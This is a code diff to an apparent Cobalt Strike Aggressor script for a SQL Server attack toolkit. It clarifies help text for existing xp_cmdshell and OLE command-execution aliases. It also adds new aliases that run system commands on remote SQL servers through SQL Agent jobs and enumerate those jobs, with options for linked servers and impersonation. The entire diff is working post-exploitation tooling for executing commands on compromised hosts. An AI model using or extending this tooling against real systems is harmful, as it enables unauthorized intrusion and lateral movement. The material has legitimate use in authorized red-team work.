@@ -585,7 +585,7 @@ alias sql-xpcmd {
 
 beacon_command_register(
 	"sql-xpcmd", 
-	"Execute a system command using xp_cmdshell", 
+	"Execute a system command using xp_cmdshell. Output returned unless using a linked server. WARNING: running a persistent command will cause the beacon to hang", 
 	"sql-xpcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]"
 );
 
@@ -612,7 +612,7 @@ alias sql-olecmd {
 
 beacon_command_register(
 	"sql-olecmd", 
-	"Execute a system command using OLE automation procedures", 
+	"Execute a system command using OLE automation procedures. Output is not returned", 
 	"sql-olecmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]"
 );
 
@@ -667,4 +667,57 @@ beacon_command_register(
 	"sql-clr", 
 	"Load and execute .NET assembly in a stored procedure", 
 	"sql-clr [server] [dll_path] [function] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-agentcmd {
+    local('$args $barch $server $command $database $link $impersonate');
+	
+	if(size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("sql-agentcmd"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+    $command = $3;
+	$database = iff(-istrue $4, $4, "");
+    $link = iff(-istrue $5, $5, "");
+    $impersonate = iff(-istrue $6, $6, "");
+    
+	btask($1, "Tasked beacon to create SQL agent job on " . $server);
+	
+	$args = bof_pack($1, "zzzzz", $server, $database, $link, $impersonate, $command);
+	beacon_inline_execute($1, readbof($1, "agentcmd"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-agentcmd", 
+	"Execute a system command using agent jobs. Output is not returned", 
+	"sql-agentcmd [server] [command] [opt: database] [opt: linkedserver] [opt: impersonate]"
+);
+
+alias sql-agentstatus {
+    local('$args $barch $server $database $link $impersonate');
+	
+	if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("sql-agentstatus"));
+		return;
+	}
+	$barch  = barch($1);
+	$server = $2;
+	$database = iff(-istrue $3, $3, "");
+    $link = iff(-istrue $4, $4, "");
+    $impersonate = iff(-istrue $5, $5, "");
+    
+	btask($1, "Tasked beacon to query SQL agent jobs on " . $server);
+	
+	$args = bof_pack($1, "zzzz", $server, $database, $link, $impersonate);
+	beacon_inline_execute($1, readbof($1, "agentstatus"), "go", $args);
+}
+
+beacon_command_register(
+	"sql-agentstatus", 
+	"Enumerate SQL agent status and jobs", 
+	"sql-agentstatus [server] [opt: database] [opt: linkedserver] [opt: impersonate]"
 );
